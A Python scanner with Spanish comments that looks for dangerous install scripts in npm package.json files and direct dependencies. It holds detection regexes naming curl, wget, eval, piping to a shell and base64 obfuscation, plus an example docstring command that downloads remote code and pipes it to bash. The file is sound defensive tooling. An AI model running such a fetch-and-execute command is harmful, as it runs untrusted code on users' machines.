"""
SCRIPTS NPM: Análisis de Comandos Maliciosos
Busca comandos de shell ofuscados o comandos de red que se disparan solos al hacer npm install.
"""

import json
import re
import os

SCRIPTS_DE_INSTALACION = {"preinstall", "install", "postinstall"}

PATRONES_DE_RIESGO = {
    "Descarga de red": re.compile(r"\b(curl|wget|fetch)\b"),
    "Ejecución de código dinámico": re.compile(r"\beval\s*\("),
    "Pipe a intérprete de comandos": re.compile(r"\|\s*(bash|sh|zsh|cmd|powershell)\b"),
    "Ejecución de binario descargado": re.compile(r"chmod\s+\+x"),
    "Codificación/ofuscación": re.compile(r"\b(base64|atob|Buffer\.from)\b"),
}


def evaluar_riesgo_script(contenido_script):
    """
    Revisa el texto de un script de instalación.
    Toma el texto de un comando (ej. "curl http://malware | bash")
    y lo cruza contra las regex.
    Devuelve la lista de patrones de riesgo que contiene.
    """
    riesgos_encontrados = []
    for nombre_patron, patron in PATRONES_DE_RIESGO.items():
        if patron.search(contenido_script):
            riesgos_encontrados.append(nombre_patron)
    return riesgos_encontrados


def nivel_de_riesgo(cantidad_patrones):
    """
    Traduce la cantidad de patrones de riesgo detectados en un script
    a una etiqueta de severidad.
    """
    if cantidad_patrones >= 2:
        return "alto"
    elif cantidad_patrones == 1:
        return "medio"
    else:
        return "bajo"


def _evaluar_scripts_de(datos_package_json, nombre_paquete):
    """
    Toma un JSON (de un package.json) ya leído, evalúa sus scripts
    de instalación filtrando los que no son de instalación y los
    pasa por la evaluación de riesgo.
    Devuelve los hallazgos etiquetándolos con el nombre del paquete
    al que pertenecen para saber de dónde salieron.

    _evaluar_scripts_de abre el package.json, mira los scripts que
    tiene adentro, y usa a evaluar_riesgo_script para evaluar cada
    uno de esos scripts por separado.
    """
    scripts = datos_package_json.get("scripts", {})
    hallazgos = []

    for nombre_script, contenido in scripts.items():
        if nombre_script not in SCRIPTS_DE_INSTALACION:
            continue
        if not isinstance(contenido, str):
            continue

        riesgos = evaluar_riesgo_script(contenido)

        if riesgos:
            hallazgos.append({
                "paquete": nombre_paquete,
                "script": nombre_script,
                "contenido": contenido,
                "patrones_detectados": riesgos,
                "riesgo": nivel_de_riesgo(len(riesgos))
            })

    return hallazgos


def encontrar_dependencias_directas(ruta_proyecto):
    """
    Se mete en node_modules/.
    Devuelve una lista de (nombre_paquete, ruta_a_su_package_json)
    por cada dependencia directa instalada en node_modules.

    Soporta paquetes con scope (ej: @angular/core). Baja un nivel
    más en el directorio (entra a la subcarpeta de la organización)
    para poder encontrar el package.json
    """
    ruta_node_modules = os.path.join(ruta_proyecto, "node_modules")

    if not os.path.isdir(ruta_node_modules):
        return []

    encontrados = []

    for nombre in os.listdir(ruta_node_modules):
        ruta_entrada = os.path.join(ruta_node_modules, nombre)

        if not os.path.isdir(ruta_entrada):
            continue

        if nombre.startswith("@"):
            for sub_nombre in os.listdir(ruta_entrada):
                ruta_pkg = os.path.join(ruta_entrada, sub_nombre, "package.json")
                if os.path.isfile(ruta_pkg):
                    encontrados.append((f"{nombre}/{sub_nombre}", ruta_pkg))
        else:
            ruta_pkg = os.path.join(ruta_entrada, "package.json")
            if os.path.isfile(ruta_pkg):
                encontrados.append((nombre, ruta_pkg))

    return encontrados


def analizar_scripts_instalacion(ruta_proyecto):
    """
    Evalúa los scripts de instalación del proyecto raíz y de cada
    dependencia directa instalada en node_modules.
    Luego, itera sobre los paths que le devuelve.
    """
    hallazgos = []

    ruta_package_json_raiz = os.path.join(ruta_proyecto, "package.json")
    with open(ruta_package_json_raiz, "r", encoding="utf-8") as archivo:
        datos_raiz = json.load(archivo)
    hallazgos.extend(_evaluar_scripts_de(datos_raiz, "(proyecto raíz)"))

    for nombre_paquete, ruta_pkg in encontrar_dependencias_directas(ruta_proyecto):
        try:
            with open(ruta_pkg, "r", encoding="utf-8") as archivo:
                datos_dependencia = json.load(archivo)
        except (json.JSONDecodeError, PermissionError, UnicodeDecodeError):
            continue

        hallazgos.extend(_evaluar_scripts_de(datos_dependencia, nombre_paquete))

    return hallazgos